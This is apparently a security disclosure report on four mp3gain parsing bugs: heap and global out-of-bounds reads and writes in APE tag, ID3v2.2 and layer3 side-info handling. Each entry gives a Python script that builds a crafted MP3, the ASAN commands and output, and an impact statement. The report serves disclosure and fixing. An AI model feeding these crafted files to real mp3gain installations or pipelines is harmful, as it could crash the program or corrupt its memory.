# mp3gain Vulnerabilities

## Bug1: Heap OOB Read in ReadMP3APETag via MP3GAIN_ALBUM_MINMAX with Zero-Length Value

In `ReadMP3APETag()` in `apetag.c` at lines 258 and 262, when an APE item named `MP3GAIN_ALBUM_MINMAX` has `item_value_size=0` the function allocates only 1 byte for the value buffer yet unconditionally calls `memcpy(tmpString, vp, 3)` without verifying that at least 3 bytes are available, causing a heap-buffer-overflow out-of-bounds read.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUT_FILE = "poc_input.mp3"

# Minimal fake MPEG1 Layer3 128kbps 44100Hz stereo frame (417 bytes)
MP3_FRAME_HEADER = bytes([0xFF, 0xFB, 0x90, 0x00])
FRAME_SIZE = 417
mp3_frame = MP3_FRAME_HEADER + bytes(FRAME_SIZE - 4)

# Malicious APE item: name="MP3GAIN_ALBUM_MINMAX", item_value_size=0
# malloc(vsize+1) = malloc(1), but memcpy reads 3 bytes -> OOB
item_value_size = 0
item_flags = 0
item_key = b"MP3GAIN_ALBUM_MINMAX\x00"  # 21 bytes with null terminator
item_value = b""

item = struct.pack("<II", item_value_size, item_flags) + item_key + item_value
# item length: 4 + 4 + 21 + 0 = 29 bytes

# APEv2 footer (footer-only, no header)
items_total = len(item)  # 29
tag_size = items_total + 32  # 61
item_count = 1
footer_flags = 0x00000000

footer = (
    b"APETAGEX"
    + struct.pack("<I", 2000)         # version APEv2
    + struct.pack("<I", tag_size)     # tag_size = items + footer
    + struct.pack("<I", item_count)
    + struct.pack("<I", footer_flags)
    + b"\x00" * 8                    # reserved
)
assert len(footer) == 32

data = mp3_frame + item + footer

with open(OUT_FILE, "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to {OUT_FILE}")
print(f"  MP3 frame:  {FRAME_SIZE} bytes")
print(f"  APE item:   {len(item)} bytes  (name=MP3GAIN_ALBUM_MINMAX, vsize=0)")
print(f"  APE footer: {len(footer)} bytes  (tag_size={tag_size})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000031 at pc 0x7f0ac5dab397 bp 0x7ffc02310b20 sp 0x7ffc023102c8
SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 in __interceptor_memcpy

### Impact

An attacker can supply a crafted MP3 file containing an APEv2 tag with an `MP3GAIN_ALBUM_MINMAX` item whose value size is zero, causing mp3gain to read up to 7 bytes beyond a 1-byte heap allocation and exposing adjacent heap memory contents. This out-of-bounds read is exposed by the default mp3gain invocation path on any untrusted file, requiring no special privileges or user interaction beyond opening the file. While the primary consequence is an information disclosure of heap contents and a likely crash, repeated triggering under memory-layout conditions could be leveraged to leak sensitive in-process data or to assist in defeating memory-safety mitigations.

<!-- REPORT_SOURCE: apetag_c#003 -->
<!-- DEDUP: ReadMP3APETag::CWE-125 -->

## Bug2: Heap Buffer Overflow Due to Missing malloc() Return Check in ReadMP3APETag

In `ReadMP3APETag()` in `apetag.c` at lines 171-175, the return value of `malloc(TagLen)` is never checked for NULL before being passed to `fread()`, and because `TagLen` is taken directly from the attacker-controlled APEv2 footer `Length` field with no upper-bound validation, supplying `Length=0xFFFFFFFF` causes ASAN to return a minimal sentinel buffer whose bounds are immediately overflowed by the subsequent `fread` or `memcpy`, resulting in a heap-buffer-overflow crash.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC Generator: heap-buffer-overflow via missing malloc() check in ReadMP3APETag()
Function: ReadMP3APETag() in apetag.c, lines 171-175
"""

import struct

OUTPUT = "poc_input.mp3"

# Minimal fake MPEG1 Layer3 frame (128kbps, 44100Hz, stereo) — 417 bytes each
FRAME_SYNC = bytes([0xFF, 0xFB])
FRAME_HDR_REST = bytes([0x90, 0x00])
FRAME_SIZE = 417
FRAME_DATA = FRAME_SYNC + FRAME_HDR_REST + bytes(FRAME_SIZE - 4)

# 4 fake MP3 frames so mp3gain opens and scans the file
NUM_FRAMES = 4
mp3_body = FRAME_DATA * NUM_FRAMES

# APEv2 Footer structure (32 bytes):
#   ID       : 8 bytes  "APETAGEX"
#   Version  : 4 bytes LE  2000 (APEv2)
#   Length   : 4 bytes LE  0xFFFFFFFF  <- triggers malloc failure / overflow
#   ItemCount: 4 bytes LE  0
#   Flags    : 4 bytes LE  0
#   Reserved : 8 bytes     0x00

APE_ID       = b"APETAGEX"
APE_VERSION  = struct.pack("<I", 2000)
APE_LENGTH   = struct.pack("<I", 0xFFFFFFFF)
APE_COUNT    = struct.pack("<I", 0)
APE_FLAGS    = struct.pack("<I", 0)
APE_RESERVED = bytes(8)

ape_footer = APE_ID + APE_VERSION + APE_LENGTH + APE_COUNT + APE_FLAGS + APE_RESERVED
assert len(ape_footer) == 32

malicious_mp3 = mp3_body + ape_footer

with open(OUTPUT, "wb") as f:
    f.write(malicious_mp3)

print(f"[+] Written {len(malicious_mp3)} bytes to {OUTPUT}")
print(f"[+] APE footer Length = 0xFFFFFFFF -> triggers malloc() failure / heap-buffer-overflow")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==15195==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000050 at pc 0x55f3ba4e0408 bp 0x7fffa0a75e40 sp 0x7fffa0a75e30
SUMMARY: AddressSanitizer: heap-buffer-overflow in ReadMP3APETag
==14525==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000031 at pc 0x7f0ac5dab397 bp 0x7ffc02310b20 sp 0x7ffc023102c8
SUMMARY: AddressSanitizer: heap-buffer-overflow in __interceptor_memcpy

### Impact

An attacker who supplies a crafted MP3 file with an APEv2 footer whose `Length` field is set to `0xFFFFFFFF` can trigger a heap-buffer-overflow in `ReadMP3APETag()`, corrupting heap memory in a way that can lead to denial of service via process crash or, under favorable heap layout conditions, to arbitrary code execution. This attack surface is exposed to any invocation of mp3gain on an untrusted file, including automated batch-processing pipelines where the tool is run without user interaction. Without ASAN the unchecked NULL returned by `malloc()` is passed directly to `fread()`, causing a reliable NULL-pointer dereference segmentation fault that unconditionally crashes the process.

<!-- REPORT_SOURCE: apetag_c#004 -->
<!-- DEDUP: ReadMP3APETag::CWE-476 -->

## Bug3: Off-by-one OOB heap read in ID3v2.2 frame size parsing

The function `id3_parse_v2_tag()` in `id3tag.c` uses an off-by-one boundary check (`p + 5 > dlen` instead of `p + 6 > dlen`) before reading a 6-byte ID3v2.2 frame header, allowing an out-of-bounds read of one heap byte past the end of the allocated tag buffer.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def syncsafe4(n):
    result = bytearray(4)
    for i in range(3, -1, -1):
        result[i] = n & 0x7F
        n >>= 7
    return bytes(result)

tag_body_size = 16
id3_header = b"ID3" + bytes([0x02, 0x00, 0x00]) + syncsafe4(tag_body_size)
assert len(id3_header) == 10

# Tag body layout (16 bytes total):
#   Bytes  0- 2: "TT2"          frame 1 ID
#   Bytes  3- 5: 0x00 0x00 0x05 frame 1 size = 5
#   Bytes  6-10: 0x00*5         frame 1 data
#   Bytes 11-13: "TT2"          frame 2 ID
#   Bytes 14-15: 0x00 0x00      first 2 of 3 size bytes for frame 2
#   Byte   16  : OOB            tagdata[16] is one past malloc(16)
#
# At frame 2: p=11, dlen=16
#   check: if (11 + 5 > 16) => false => no badtag
#   read:  tagdata[11+5] = tagdata[16] => heap-buffer-overflow
tag_body = (
    b"TT2" +
    bytes([0x00, 0x00, 0x05]) +
    bytes(5) +
    b"TT2" +
    bytes([0x00, 0x00])
)
assert len(tag_body) == 16

mp3_sync = bytes([0xFF, 0xFB, 0x90, 0x00])
mp3_padding = bytes(413)

data = id3_header + tag_body + mp3_sync + mp3_padding

with open("poc_input.mp3", "wb") as f:
    f.write(data)

print(f"Written {len(data)} bytes to poc_input.mp3")
print(f"  ID3 header: {id3_header.hex()}")
print(f"  Tag body:   {tag_body.hex()}")
print(f"  dlen=16: malloc(16) -> tagdata[16] is in heap right redzone")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain -s i poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000040 at pc 0x5648188675c9 bp 0x7ffd159fdb00 sp 0x7ffd159fdaf0
READ of size 1 at 0x502000000040 thread T0
    #0 0x5648188675c8 in id3_parse_v2_tag
    #1 0x564818868748 in id3_search_tag
0x502000000040 is located 0 bytes to the right of 16-byte region [0x502000000030,0x502000000040)
=>0x0a047fff8000: fa fa 00 00 fa fa 00 00[fa]fa 05 fa fa fa fa fa

### Impact

An attacker who supplies a crafted MP3 file with a malformed ID3v2.2 tag can cause mp3gain to read one byte past the end of a heap allocation, exposing heap metadata or adjacent object data (information disclosure) and potentially crashing the process when the allocation ends at a page boundary (denial of service). Any invocation of mp3gain with the `-s i` flag on an untrusted file triggers this path, making the attack surface all command-line and automated batch uses of mp3gain. While the out-of-bounds byte feeds into a frame-length calculation, subsequent bounds checks limit further memory corruption beyond the initial one-byte read.

<!-- REPORT_SOURCE: id3tag_c#001 -->
<!-- DEDUP: id3_parse_v2_tag::CWE-125 -->

## Bug4: OOB Read in bandInfo.longIdx Cascades to Unbounded OOB Write in III_dequantize_sample

In `III_get_side_info_1()` in `mpglibDBL/layer3.c` (line 403), the index `r0c+1+r1c+1` computed from unchecked 4-bit and 3-bit bitstream fields can reach 24 while `bandInfo[sfreq].longIdx` has only 23 elements, causing an out-of-bounds read that corrupts `region2start` and subsequently triggers a near-unbounded out-of-bounds write loop in `III_dequantize_sample()` when the derived `l[1]` value becomes negative.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import os

def bits_to_bytes(bit_str: str) -> bytes:
    pad = (8 - len(bit_str) % 8) % 8
    padded = bit_str + '0' * pad
    result = bytearray()
    for i in range(0, len(padded), 8):
        result.append(int(padded[i:i+8], 2))
    return bytes(result)


def build_side_info_mono() -> bytes:
    bits = ""

    # Header fields
    bits += format(0,   '09b')  # main_data_begin = 0
    bits += format(0,   '05b')  # private_bits
    bits += format(0,   '04b')  # scfsi for ch=0, gr[1]

    # Two granules, identical
    for _gr in range(2):
        bits += format(100, '012b')  # part2_3_length = 100
        bits += format(100, '09b')   # big_values = 100  <- ensures bv > region2
        bits += format(100, '08b')   # global_gain = 100
        bits += format(0,   '04b')   # scalefac_compress
        bits += '0'                  # window_switching_flag = 0
        bits += format(1,   '05b')   # table_select[0] = 1
        bits += format(1,   '05b')   # table_select[1] = 1
        bits += format(1,   '05b')   # table_select[2] = 1
        bits += format(15,  '04b')   # r0c = 15 <- OOB trigger (r0c+1+r1c+1 = 24)
        bits += format(7,   '03b')   # r1c = 7  <- OOB trigger
        bits += '0'                  # preflag
        bits += '0'                  # scalefac_scale
        bits += '0'                  # count1table_select

    assert len(bits) == 136
    data = bits_to_bytes(bits)
    assert len(data) == 17
    return data


# MPEG1 Layer3 128 kbps 44100 Hz Mono, no CRC
# Frame size = floor(144 * 128000 / 44100) = 417 bytes
HEADER     = bytes([0xFF, 0xFB, 0x90, 0xC0])
FRAME_SIZE = 417
SIDE_INFO  = build_side_info_mono()
MAIN_DATA  = bytes(FRAME_SIZE - len(HEADER) - len(SIDE_INFO))

assert len(MAIN_DATA) == 396
FRAME = HEADER + SIDE_INFO + MAIN_DATA
assert len(FRAME) == FRAME_SIZE

mp3_bytes = FRAME * 3

with open("poc_input.mp3", "wb") as fh:
    fh.write(mp3_bytes)

print(f"[+] Wrote {len(mp3_bytes)} bytes to poc_input.mp3")
print(f"[+] r0c=15, r1c=7 -> longIdx[24] aliases longDiff[1]=4 -> region2start=2")
print(f"[+] big_values=100 -> l[1]=2-81=-79 (negative, triggers OOB write loop)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** mpglibDBL/layer3.c:403:58: runtime error: index 24 out of bounds for type 'short int [23]'
==562435==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55e603bf4d58 at pc 0x55e603bd3f85 bp 0x7ffc5a112d70 sp 0x7ffc5a112d60
READ of size 4 at 0x55e603bf4d58 thread T0
    #0 0x55e603bd3f84 in III_dequantize_sample
    #1 0x55e603be0fb9 in do_layer3
0x55e603bf4d58 is located 0 bytes to the right of global variable 'pretab2' defined in 'mpglibDBL/layer3.c:651:18' (0x55e603bf4d00) of size 88
SUMMARY: AddressSanitizer: global-buffer-overflow in III_dequantize_sample

### Impact

An attacker can supply a crafted MP3 file with maximally set `r0c` and `r1c` side-information fields to cause an out-of-bounds read that corrupts `region2start`, which then drives a loop in `III_dequantize_sample()` to execute approximately 2^32 iterations of out-of-bounds writes past the `xr` buffer, destroying adjacent global state including `wordpointer` and `bitindex`. This vulnerability is exposed on any invocation of mp3gain against an untrusted MP3 file and can lead to denial of service through process crash or, under favorable memory layouts, arbitrary code execution.

<!-- REPORT_SOURCE: mpglibDBL_layer3_c#001 -->
<!-- DEDUP: `III_get_side_info_1::CWE-125 -->
